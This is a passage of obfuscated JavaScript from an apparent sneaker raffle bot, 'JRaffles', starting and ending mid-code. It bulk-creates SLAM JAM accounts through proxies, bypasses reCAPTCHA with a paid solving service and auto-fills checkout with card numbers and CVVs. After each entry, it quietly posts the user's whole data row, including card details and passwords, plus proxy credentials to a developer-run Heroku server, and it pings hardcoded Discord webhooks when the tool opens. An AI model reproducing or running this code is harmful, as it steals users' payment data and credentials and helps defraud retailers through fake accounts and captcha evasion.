                                console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x1e8c04[taskModule]['name'] + ']\x20Task\x20' + (_0x390c84 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x24ea9a));
                            }
                        } catch (_0xdf9733) {
                            console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x1e8c04[taskModule]['name'] + ']\x20Task\x20' + (_0x390c84 + 0x1) + '\x20:\x20' + _0xdf9733)), _0x1ce411 = 'yes';
                        } finally {
                            _0x4e6d34 && _0x4e6d34['close']();
                            if (_0x1ce411 == 'yes' && _0x12040c != 0x5 && _0x7ca5dd != 'Size\x20Not\x20Found') {
                                console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x3a90e1['name'] + ']\x20Task\x20' + (_0x390c84 + 0x1) + '\x20:\x20Retrying\x20(' + _0x12040c + '\x20/\x205)')), _0x390c84 = _0x390c84 - 0x1, _0x12040c = _0x12040c + 0x1;
                                continue;
                            }
                            _0x1ce411 == 'yes' && _0x12040c >= 0x5 && (_0x5f4429(_0x3edb8d[_0x390c84], _0x3a90e1), _0x1ce411 = 'no', _0x12040c = 0x0), console['log']('Waiting\x20for\x20' + _0x79d23a['delay'] + '\x20ms'), await _0x289b0b(_0x79d23a['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x3aedad, _0x22aa94, _0x26bdbe) {
                    _0x2926d5['use'](_0x409c7d()), _0x2926d5['use'](_0x4a68ab({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x79d23a['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x46b002 = 0x0; _0x46b002 < _0x22aa94['length']; _0x46b002++) {
                        if (_0x48d40a != 'yes')
                            var _0x48d40a = '', _0x21c59b = 0x0;
                        var _0xc95925 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x2e53d0
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x79d23a['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x492c9c
                                }
                            ]
                        }];
                        const _0x5a4e3f = { 'embeds': _0xc95925 };
                        _0x25b0b6(_0x3aedad['name'] + '\x20Task\x20' + (_0x46b002 + 0x1) + '\x20/\x20' + _0x22aa94['length'] + '\x20||\x20File:\x20' + _0x273bbf + '\x20Proxies:\x20' + _0x11770e);
                        try {
                            await _0x5af4d5(_0x22aa94, _0x46b002);
                        } catch {
                            _0x48d40a = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x5896d8 = await _0x117512(_0x22aa94[_0x46b002], _0x3aedad, 'acc', ![]);
                        const _0x4b404b = { 'succesDEVMSG': { 'embeds': [_0x5896d8] } };
                        if (_0x22aa94[_0x46b002]['Email'] == '' || _0x22aa94[_0x46b002]['FirstName'] == '' || _0x22aa94[_0x46b002]['LastName'] == '') {
                            console['log'](_0x3d201d() + '\x20[' + _0x1e8c04[taskModule]['name'] + ']\x20Task\x20' + (_0x46b002 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x289b0b(0x7d0);
                            continue;
                        }
                        (_0x22aa94[_0x46b002]['Password'] == '' || _0x22aa94[_0x46b002] == undefined) && _0x22aa94[_0x46b002]['Password'] == 'JRaffles23!';
                        if (_0x79d23a['useRandomProxy'] = ![])
                            var _0x3da919 = _0x26bdbe[_0x46b002]['split'](':');
                        else
                            var _0x10b43e = Math['round'](Math['random']() * (_0x26bdbe['length'] - 0x1)), _0x3da919 = _0x26bdbe[_0x10b43e]['split'](':');
                        var _0x4322a9;
                        try {
                            _0x4322a9 = await _0x2926d5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3da919[0x0] + ':' + _0x3da919[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4322a9 = await _0x2926d5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3da919[0x0] + ':' + _0x3da919[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1625b4 = await _0x4322a9['newPage']();
                            await _0x1625b4['authenticate']({
                                'username': '' + _0x3da919[0x2],
                                'password': '' + _0x3da919[0x3]
                            }), console['log'](_0x3d201d() + '\x20[' + _0x3aedad['name'] + ']\x20Task\x20' + (_0x46b002 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1625b4['setRequestInterception'](!![]), _0x1625b4['on']('request', _0x35aa36 => {
                                _0x35aa36['resourceType']() === 'image' || _0x35aa36['resourceType']() === 'font' || _0x35aa36['resourceType']() === 'media' ? _0x35aa36['abort']() : _0x35aa36['continue']();
                            }), await _0x1625b4['goto']('https://drop.slamjam.com/account/register'), await _0x289b0b(0xbb8), await _0x1625b4['waitForSelector']('#FirstName'), await _0x1625b4['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x1625b4['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x3d201d() + '\x20[' + _0x3aedad['name'] + ']\x20Task\x20' + (_0x46b002 + 0x1) + '\x20:\x20Filling\x20information'), await _0x289b0b(0x4b0), await _0x1625b4['type']('#FirstName', '' + _0x22aa94[_0x46b002]['FirstName']), await _0x289b0b(0x226), await _0x1625b4['type']('#LastName', '' + _0x22aa94[_0x46b002]['LastName']), await _0x289b0b(0x226), await _0x1625b4['type']('#Email', '' + _0x22aa94[_0x46b002]['Email']), await _0x289b0b(0x2ee), await _0x1625b4['type']('#ConfirmEmail', '' + _0x22aa94[_0x46b002]['Email']), await _0x289b0b(0x2ee), await _0x1625b4['type']('#CreatePassword', '' + _0x22aa94[_0x46b002]['Password']), await _0x289b0b(0x2ee), await _0x1625b4['type']('#CreateConfirmPassword', '' + _0x22aa94[_0x46b002]['Password']), await _0x289b0b(0x226), console['log'](_0x3d201d() + '\x20[' + _0x3aedad['name'] + ']\x20Task\x20' + (_0x46b002 + 0x1) + '\x20:\x20Submitting..'), await _0x1625b4['$eval']('#create_customer', _0xd6d2f5 => _0xd6d2f5['submit']()), await _0x289b0b(0x1388), console['log'](_0x3d201d() + '\x20[' + _0x3aedad['name'] + ']\x20Task\x20' + (_0x46b002 + 0x1) + '\x20:\x20' + _0x1ac777['cyan']('Solving\x20Captcha')), await _0x1625b4['solveRecaptchas'](), console['log'](_0x3d201d() + '\x20[' + _0x3aedad['name'] + ']\x20Task\x20' + (_0x46b002 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x1625b4['$eval']('.shopify-challenge__container\x20>\x20form', _0xeebf6c => _0xeebf6c['submit']());
                            try {
                                await _0x1625b4['waitForSelector']('.product-card__image'), await _0x289b0b(0x1f4), _0x48d40a = 'no', console['log'](_0x1ac777['green'](_0x3d201d() + '\x20[' + _0x3aedad['name'] + ']\x20Task\x20' + (_0x46b002 + 0x1) + '\x20:\x20Account\x20' + _0x22aa94[_0x46b002]['Email'] + '\x20Generated!')), _0x457b0a['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x22aa94[_0x46b002]['Email'] + ',' + _0x22aa94[_0x46b002]['Password']), console['log'](_0x1ac777['yellow'](_0x3d201d() + '\x20[' + _0x3aedad['name'] + ']\x20Task\x20' + (_0x46b002 + 0x1) + '\x20:\x20Account\x20' + _0x22aa94[_0x46b002]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '' && await _0x15c654(_0x79d23a['webhook'], _0x4b404b['succesDEVMSG']);
                                } catch {
                                }
                                await _0x15c654(_0x534fd1, _0x4b404b['succesDEVMSG']);
                            } catch (_0x372e09) {
                                console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x1e8c04[taskModule]['name'] + ']\x20Task\x20' + (_0x46b002 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x372e09));
                            }
                        } catch (_0x5a95c6) {
                            console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x1e8c04[taskModule]['name'] + ']\x20Task\x20' + (_0x46b002 + 0x1) + '\x20:\x20' + _0x5a95c6));
                        } finally {
                            _0x4322a9 && _0x4322a9['close']();
                            if (_0x48d40a == 'yes' && _0x21c59b != 0x5) {
                                console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x3aedad['name'] + ']\x20Task\x20' + (_0x46b002 + 0x1) + '\x20:\x20Retrying\x20(' + _0x21c59b + '\x20/\x205)')), _0x46b002 = _0x46b002 - 0x1, _0x21c59b = _0x21c59b + 0x1;
                                continue;
                            }
                            _0x48d40a == 'yes' && _0x21c59b >= 0x5 && (_0x5f4429(_0x22aa94[_0x46b002], _0x3aedad), _0x48d40a = 'no', _0x21c59b = 0x0), console['log']('Waiting\x20for\x20' + _0x79d23a['delay'] + '\x20ms'), await _0x289b0b(_0x79d23a['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x174a9a, _0x29eb55, _0x581de9) {
                    _0x2926d5['use'](_0x409c7d()), _0x2926d5['use'](_0x4a68ab({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x79d23a['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4ae543 = 0x0; _0x4ae543 < _0x29eb55['length']; _0x4ae543++) {
                        var _0x2cd044;
                        if (_0x178bd6 != 'yes')
                            var _0x178bd6 = '', _0x47705f = 0x0;
                        _0x25b0b6(_0x174a9a['name'] + '\x20Task\x20' + (_0x4ae543 + 0x1) + '\x20/\x20' + _0x29eb55['length'] + '\x20||\x20File:\x20' + _0x273bbf + '\x20Proxies:\x20' + _0x11770e);
                        try {
                            await _0x5af4d5(_0x29eb55, _0x4ae543);
                        } catch {
                            _0x178bd6 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x29eb55[_0x4ae543]['Email'] == '' || _0x29eb55[_0x4ae543]['Password'] == '' || _0x29eb55[_0x4ae543]['FirstName'] == '' || _0x29eb55[_0x4ae543]['LastName'] == '') {
                            console['log'](_0x3d201d() + '\x20[' + _0x174a9a['name'] + ']\x20Task\x20' + (_0x4ae543 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x79d23a['useRandomProxy'] = ![])
                            var _0x3bb2f5 = _0x581de9[_0x4ae543]['split'](':');
                        else
                            var _0x24fc18 = Math['round'](Math['random']() * (_0x581de9['length'] - 0x1)), _0x3bb2f5 = _0x581de9[_0x24fc18]['split'](':');
                        var _0x14b96e;
                        try {
                            _0x14b96e = await _0x2926d5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3bb2f5[0x0] + ':' + _0x3bb2f5[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x14b96e = await _0x2926d5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3bb2f5[0x0] + ':' + _0x3bb2f5[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x4c3c1d = await _0x14b96e['newPage']();
                            await _0x4c3c1d['authenticate']({
                                'username': '' + _0x3bb2f5[0x2],
                                'password': '' + _0x3bb2f5[0x3]
                            }), await _0x4c3c1d['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x3d201d() + '\x20[' + _0x174a9a['name'] + ']\x20Task\x20' + (_0x4ae543 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4c3c1d['setRequestInterception'](!![]), _0x4c3c1d['on']('request', _0x5c6c94 => {
                                _0x5c6c94['resourceType']() === 'image' || _0x5c6c94['resourceType']() === 'font' || _0x5c6c94['resourceType']() === 'media' ? _0x5c6c94['abort']() : _0x5c6c94['continue']();
                            }), await _0x4c3c1d['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x4c3c1d['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x4c3c1d['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x289b0b(0x258), await _0x4c3c1d['waitForSelector']('#CustomerEmail'), console['log'](_0x3d201d() + '\x20[' + _0x174a9a['name'] + ']\x20Task\x20' + (_0x4ae543 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x4c3c1d['type']('#CustomerEmail', '' + _0x29eb55[_0x4ae543]['Email']), await _0x289b0b(0x12c), await _0x4c3c1d['type']('#CustomerPassword', '' + _0x29eb55[_0x4ae543]['Password']), await _0x289b0b(0x226), await _0x4c3c1d['$eval']('#customer_login', _0x26d8d9 => _0x26d8d9['submit']()), await _0x289b0b(0x7d0), await _0x4c3c1d['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x3d201d() + '\x20[' + _0x174a9a['name'] + ']\x20Task\x20' + (_0x4ae543 + 0x1) + '\x20:\x20' + _0x1ac777['cyan']('Solving\x20Captcha')), await _0x4c3c1d['solveRecaptchas'](), console['log'](_0x3d201d() + '\x20[' + _0x174a9a['name'] + ']\x20Task\x20' + (_0x4ae543 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x4c3c1d['$eval']('.shopify-challenge__container\x20>\x20form', _0x14027a => _0x14027a['submit']());
                            try {
                                await _0x4c3c1d['waitForSelector']('.nav-account'), await _0x289b0b(0x4b0);
                            } catch {
                                console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x174a9a['name'] + ']\x20Task\x20' + (_0x4ae543 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x4c3c1d['goto']('' + _0x29eb55[_0x4ae543]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x289b0b(0xbb8), console['log'](_0x3d201d() + '\x20[' + _0x174a9a['name'] + ']\x20Task\x20' + (_0x4ae543 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x4c3c1d['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x4c3c1d['click']('.product-select-variant-wrapper'), await _0x289b0b(0x320), await _0x4c3c1d['click']('li.product-select-variant__value[data-size=\x22' + _0x29eb55[_0x4ae543]['Size'] + '\x22]'), await _0x289b0b(0x384), await _0x4c3c1d['$eval']('#AddToCartForm-product-template-raffle', _0x32c631 => _0x32c631['submit']()), await _0x4c3c1d['waitForSelector']('.cart-order-summary__content'), await _0x289b0b(0x514), await _0x4c3c1d['goto']('https://drop.slamjam.com/checkout'), await _0x289b0b(0x514), await _0x4c3c1d['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x3d201d() + '\x20[' + _0x174a9a['name'] + ']\x20Task\x20' + (_0x4ae543 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x4c3c1d['select']('#checkout_shipping_address_country', '' + _0x29eb55[_0x4ae543]['Country']), await _0x289b0b(0x200), await _0x4c3c1d['waitForSelector']('#checkout_shipping_address_first_name'), await _0x4c3c1d['type']('#checkout_shipping_address_first_name', '' + _0x29eb55[_0x4ae543]['FirstName']), await _0x289b0b(0x237), await _0x4c3c1d['type']('#checkout_shipping_address_last_name', '' + _0x29eb55[_0x4ae543]['LastName']), await _0x289b0b(0x1e0), await _0x4c3c1d['type']('#checkout_shipping_address_address1', _0x29eb55[_0x4ae543]['Address1'] + '\x20' + _0x29eb55[_0x4ae543]['HouseNumber']), await _0x289b0b(0x514), await _0x4c3c1d['type']('#checkout_shipping_address_address2', '' + _0x29eb55[_0x4ae543]['Address2']), await _0x289b0b(0x514);
                            _0x29eb55[_0x4ae543]['Postcode'] == undefined && (_0x29eb55[_0x4ae543]['Postcode'] = _0x29eb55[_0x4ae543]['Zip']);
                            await _0x4c3c1d['type']('#checkout_shipping_address_zip', '' + _0x29eb55[_0x4ae543]['Postcode']), await _0x289b0b(0x2bc), await _0x4c3c1d['type']('#checkout_shipping_address_city', '' + _0x29eb55[_0x4ae543]['City']), await _0x289b0b(0x320), await _0x4c3c1d['type']('#checkout_shipping_address_phone', '' + _0x29eb55[_0x4ae543]['Phone']), await _0x289b0b(0x320), await _0x4c3c1d['click']('#continue_button'), await _0x289b0b(0xbb8), await _0x4c3c1d['waitForSelector']('.summary-title'), await _0x289b0b(0x320), await _0x4c3c1d['click']('#continue_button'), await _0x289b0b(0x320), console['log'](_0x3d201d() + '\x20[' + _0x174a9a['name'] + ']\x20Task\x20' + (_0x4ae543 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x4c3c1d['waitForSelector']('#checkout_credit_card_vault'), await _0x289b0b(0x3e8);
                            var _0x4aa7d1 = await _0x4c3c1d['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x33aba9 = await _0x4aa7d1['contentFrame']();
                            await _0x33aba9['click']('#number'), await _0x289b0b(0x3e8), await _0x33aba9['type']('#number', '' + _0x29eb55[_0x4ae543]['CardNumber'], { 'delay': 0x78 }), _0x4aa7d1 = await _0x4c3c1d['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x33aba9 = await _0x4aa7d1['contentFrame'](), await _0x289b0b(0x1c2), await _0x33aba9['click']('#name'), await _0x289b0b(0x1f4), await _0x33aba9['type']('#name', '' + _0x29eb55[_0x4ae543]['NameOnCard'], { 'delay': 0x78 }), _0x4aa7d1 = await _0x4c3c1d['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x33aba9 = await _0x4aa7d1['contentFrame'](), await _0x289b0b(0x1c2), await _0x33aba9['click']('#expiry'), await _0x289b0b(0x1f4), await _0x33aba9['type']('#expiry', '' + _0x29eb55[_0x4ae543]['ExpiryDate'], { 'delay': 0x78 }), _0x4aa7d1 = await _0x4c3c1d['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x33aba9 = await _0x4aa7d1['contentFrame'](), await _0x289b0b(0x1c2), await _0x33aba9['click']('#verification_value'), await _0x289b0b(0x1f4), await _0x33aba9['type']('#verification_value', '' + _0x29eb55[_0x4ae543]['CVV'], { 'delay': 0x78 }), await _0x4c3c1d['$eval']('#accepts-flag-raffle', _0x241331 => _0x241331['click']()), await _0x289b0b(0x7d0), console['log'](_0x3d201d() + '\x20[' + _0x174a9a['name'] + ']\x20Task\x20' + (_0x4ae543 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x4c3c1d['$eval']('#continue_button', _0x144f4e => _0x144f4e['click']()), await _0x289b0b(0x1b58), await _0x4c3c1d['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x4c3c1d['$eval']('.edit_checkout.animate-floating-labels', _0x55e44e => _0x55e44e['submit']()), await _0x289b0b(0x7d0);
                            try {
                                await _0x4c3c1d['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x178bd6 = 'no', _0x53c50d(_0x29eb55[_0x4ae543], _0x174a9a), console['log'](_0x1ac777['green'](_0x3d201d() + '\x20[' + _0x174a9a['name'] + ']\x20Task\x20' + (_0x4ae543 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x23e548) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x23e548['message']);
                            }
                            var _0x8a4fb = await _0x117512(_0x29eb55[_0x4ae543], _0x174a9a, 'dev', ![]), _0x194d20 = await _0x117512(_0x29eb55[_0x4ae543], _0x174a9a, 'pub', ![]);
                            let _0x1f4d84 = _0x29eb55[_0x4ae543];
                            try {
                                prxdata = {
                                    'username': _0x2e53d0['replace']('#', ''),
                                    'module': _0x174a9a['name'],
                                    'entrydata': JSON['stringify'](_0x1f4d84),
                                    'proxy': '' + _0x581de9[_0x4ae543]
                                };
                                var _0x31b29c = JSON['stringify'](prxdata);
                                let _0x5a49de = { 'headers': { 'content-type': 'application/json' } };
                                await _0x500c10['post']('https://jraffles.herokuapp.com/success', _0x31b29c, _0x5a49de);
                            } catch (_0x53dd6d) {
                            }
                            const _0x5361a6 = {
                                'succesDEVMSG': { 'embeds': [_0x8a4fb] },
                                'succesPUBMSG': { 'embeds': [_0x194d20] }
                            };
                            try {
                                _0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '' && await _0x15c654(_0x79d23a['webhook'], _0x5361a6['succesDEVMSG']), await _0x289b0b(0xc8), await _0x15c654(_0x59432e, _0x5361a6['succesDEVMSG']), await _0x289b0b(0xc8), await _0x15c654(_0x1d7baa, _0x5361a6['succesPUBMSG']);
                            } catch (_0x3d47ff) {
                                console['log'](_0x1ac777['yellow'](_0x3d201d() + '\x20[' + _0x1e8c04[taskModule]['name'] + ']\x20Task\x20' + (_0x4ae543 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x3d47ff));
                            }
                        } catch (_0x5b6fbd) {
                            console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x1e8c04[taskModule]['name'] + ']\x20Task\x20' + (_0x4ae543 + 0x1) + '\x20:\x20' + _0x5b6fbd)), _0x2cd044 = '' + _0x5b6fbd;
                            var _0x1413ad = await _0x117512(kickz[_0x4ae543], _0x174a9a, 'dev', !![], _0x2cd044);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x1413ad] }, _0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '' && await _0x15c654(_0x79d23a['webhook'], EMBEDS['errorDEV']), await _0x15c654(_0x34ab86, EMBEDS['errorDEV']), _0x178bd6 = 'yes';
                        } finally {
                            _0x14b96e && _0x14b96e['close']();
                            if (_0x178bd6 == 'yes' && _0x47705f != 0x5 && _0x2cd044 != 'Size\x20Not\x20Found') {
                                console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x174a9a['name'] + ']\x20Task\x20' + (_0x4ae543 + 0x1) + '\x20:\x20Retrying\x20(' + _0x47705f + '\x20/\x205)')), _0x4ae543 = _0x4ae543 - 0x1, _0x47705f = _0x47705f + 0x1;
                                continue;
                            }
                            _0x178bd6 == 'yes' && _0x47705f >= 0x5 && (_0x5f4429(_0x29eb55[_0x4ae543], _0x174a9a), _0x178bd6 = 'no', _0x47705f = 0x0), console['log']('Waiting\x20for\x20' + _0x79d23a['delay'] + '\x20ms'), await _0x289b0b(_0x79d23a['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x1031d8) {
                    var _0x5ea6d1 = await _0x1082d0(), _0x420f99 = _0x457b0a['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x38c4a0 = _0x1b57da['parse'](_0x420f99, { 'header': !![] })['data'];
                    for (var _0x3051d1 = 0x0; _0x3051d1 < _0x38c4a0['length']; _0x3051d1++) {
                        var _0x3706ca = _0x38c4a0[_0x3051d1]['Store'], _0x8bb26e = _0x38c4a0[_0x3051d1]['Mode'];
                        for (var _0x711c45 of _0x1e8c04) {
                            const _0x59f58d = _0x711c45['name']['includes'](_0x3706ca);
                            if (!_0x59f58d)
                                continue;
                            for (mode of _0x711c45['modules']) {
                                if (mode['name'] == _0x8bb26e) {
                                    console['log']('Running\x20' + _0x1ac777['cyan'](mode['name'])), await mode['function'](mode, [_0x38c4a0[_0x3051d1]], _0x5ea6d1);
                                    var _0x53fe1b = _0x420f99['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x457b0a['writeFileSync']('../failed-tasks.csv', _0x53fe1b);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x51820a = await _0x4bf4a7['get']('Answer');
                    if (_0x51820a['Answer']['toLowerCase']() == 'y') {
                        _0x457b0a['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x289b0b(0x3e8);
                        return;
                    }
                    if (_0x51820a['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x289b0b(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x289b0b(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x283543(_0x4d2896) {
    var _0x7dfe7d = await _0x1082d0(), _0xd1b072 = _0x457b0a['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x276813 = _0x1b57da['parse'](_0xd1b072, { 'header': !![] })['data'];
    for (var _0x4e87ac = 0x0; _0x4e87ac < _0x276813['length']; _0x4e87ac++) {
        var _0x4c62dc = _0x276813[_0x4e87ac]['Store'], _0x16690d = _0x276813[_0x4e87ac]['Mode'];
        for (var _0x58e62b of _0x1e8c04) {
            const _0x5ec7a7 = _0x58e62b['name']['includes'](_0x4c62dc);
            if (_0x5ec7a7)
                for (mode of _0x1e8c04[_0x58e62b]['modules']) {
                    const _0xf69ce0 = mode['name']['includes'](_0x16690d);
                    _0xf69ce0 && (_0x4d2896 = mode['name'], await mode['function'](_0x4d2896, _0x276813[_0x4e87ac], _0x7dfe7d));
                }
        }
    }
}
async function _0xe3d2bf() {
    await _0x4f45a9(), console['clear']();
    _0x79d23a['threads'] > 0x5 && (_0x79d23a['threads'] = 0x5);
    if (_0x492c9c != 'devkey') {
        let _0x1cf012 = await _0x2e6e9d['autoUpdate']();
        if (_0x1cf012 === 'yes')
            return _0x4b1b19('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x323fa2 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x289b0b(0x2710);
        ;
    }
    await _0x39ef7e(_0x323fa2);
    if (_0x85f0b1 === ![])
        return console['log']('Closing\x20Browser'), await _0x289b0b(0xbb8);
    else
        try {
            var _0x260af9 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x2e53d0
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x492c9c
                    }
                ]
            }];
            const _0x1b61c3 = { 'embeds': _0x260af9 };
            var _0x27aec7 = await _0x117512(null, null, 'open', ![]);
            const _0x450ac5 = { 'openDEVMSG': { 'embeds': [_0x27aec7] } };
            await _0x15c654(_0x112aef, _0x450ac5['openDEVMSG']);
            async function _0x56f339() {
                _0x25b0b6('JRaffles\x20' + _0x492c9c), console['clear'](), console['log']('Hello\x20' + _0x1ac777['cyan']('' + _0x2e53d0) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x492c9c), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x3aca2a = 0x0; _0x3aca2a < _0x1e8c04['length'] - 0x4; _0x3aca2a++) {
                    if (_0x3aca2a >= 0xa) {
                        console['log']('\x20(' + _0x3aca2a + ')\x20[' + _0x1e8c04[_0x3aca2a]['name'] + ']');
                        continue;
                    }
                    if (_0x1e8c04[_0x3aca2a]['name'] === 'Reload\x20Settings' || _0x1e8c04[_0x3aca2a]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x3aca2a + ')\x20\x20[' + _0x1e8c04[_0x3aca2a]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x1e8c04['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x1e8c04['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x1e8c04['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x1e8c04['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x2a2ef6();
